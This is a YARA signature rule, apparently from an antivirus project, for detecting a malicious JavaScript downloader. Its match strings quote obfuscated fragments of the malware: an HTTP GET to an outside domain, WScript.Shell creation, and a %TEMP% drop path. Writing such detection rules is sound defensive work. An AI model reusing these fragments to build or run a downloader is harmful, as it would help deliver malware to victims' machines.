rule sig_20160427_56ea2be6969d6f3b4bc9d3e98610616c {
  meta:
    description = "datamaliciousorder - file 20160427_56ea2be6969d6f3b4bc9d3e98610616c.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "facb1eaf2abc3d58e6500b6c9f33f50c2d74a281430b6c65e54ef41a0f70663c"

  strings:
    $s1  = "WqfmqXlfbl[JpzteJoxeo](\"G\" + \"ET\", \"http://pediatriayvacunas.com/q0wps\", false);" fullword ascii
    $s2  = "function XiuxyTooqc() {return HojcuAixew[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"ga1UlGf" ascii
    $s3  = "function XiuxyTooqc() {return HojcuAixew[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"ga1UlGf" ascii
    $s4  = "function ZrkqvFftdv(GikjuGbgus, YvgbqJmjrx){ZdscqWavac = ZdscqWavac * 1; return GikjuGbgus - YvgbqJmjrx;};" fullword ascii
    $s5  = "var HojcuAixew = function GnddeWyumh() {return EryjjYdrct[ZlpenXvdcq](\"WScript\"+\".Shell\");}(), KokeeYuoiw = 11;" fullword ascii
    $s6  = "var EryjjYdrct = this[\"WScript\"];" fullword ascii
    $s7  = "if (WqfmqXlfbl[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s8  = "function AgvifLunka() {return ((NjtgqWbdul == true) && (NjtgqWbdul == XdvsbUmmgo)) ? 1 : ZdscqWavac;};" fullword ascii
    $s9  = "return ZrkqvFftdv(TvsbiQfhmj, KkwfgHqqco);" fullword ascii
    $s10 = "function McuffEyjrr()" fullword ascii
    $s11 = "VhaolYxsaw = true;" fullword ascii
    $s12 = "var VhaolYxsaw = false;" fullword ascii
    $s13 = "var XdvsbUmmgo = false;" fullword ascii
    $s14 = "}while (MxjamDzghz);" fullword ascii
    $s15 = "XdvsbUmmgo = true; " fullword ascii
    $s16 = "function CjjttVpsho(){return ZlpenXvdcq;};" fullword ascii
    $s17 = "function YnjjvSqgfc(){return 23;};" fullword ascii
    $s18 = "var NjtgqWbdul = false;" fullword ascii
    $s19 = "function CjdooNebns(UwsjnBussd) {var LdjubHjjcp = (1, 2, 3, 4, 5, UwsjnBussd); return LdjubHjjcp;};" fullword ascii
    $s20 = "function NtsvvScade(){return MvyxuYylxj + \"\";};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}